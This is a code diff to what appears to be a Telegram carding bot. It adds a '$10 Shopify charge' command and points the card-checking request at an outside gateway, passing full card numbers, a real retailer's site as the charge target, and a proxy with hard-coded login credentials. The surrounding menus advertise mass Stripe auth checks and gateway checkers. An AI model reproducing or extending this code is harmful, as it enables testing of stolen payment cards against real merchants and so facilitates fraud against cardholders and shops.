@@ -481,6 +481,7 @@ async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{bullet_link} <code>/mass</code> - Mass Stripe Auth 2\n"
         f"{bullet_link} <code>/gate site url</code> - Payment Gateway Checker\n"
         f"{bullet_link} <code>/sh</code> - Shopify 0.98$\n"
+        f"{bullet_link} <code>/sh</code> – Shopify Charge $10\n"
         f"{bullet_link} <code>/seturl &lt;site url&gt;</code> - Set a Shopify site\n"
         f"{bullet_link} <code>/adurls &lt;site url&gt;</code> - Set 20 shopify sites\n"
         f"{bullet_link} <code>/removeall</code> - Remove all added sites\n"
@@ -888,6 +889,7 @@ async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         "🔹 <b>𝙎𝙝𝙤𝙥𝙞𝙛𝙮</b>\n"
         f"{bullet_link} <code>/sh</code> – Shopify Charge $0.98\n"
+        f"{bullet_link} <code>/sh</code> – Shopify Charge $10\n"
         f"{bullet_link} <code>/seturl &lt;site url&gt;</code> – Set your Shopify site\n"
         f"{bullet_link} <code>/sp</code> – Auto check on your saved Shopify site\n"
         f"{bullet_link} <code>/msp</code> – Mass Shopify Charged\n"
@@ -2834,8 +2836,8 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://auto-hc-gateway.onrender.com/index.php"
-            f"?site=https://example-hc-site.com"
+            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"?site=https://shop.outsideonline.com"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
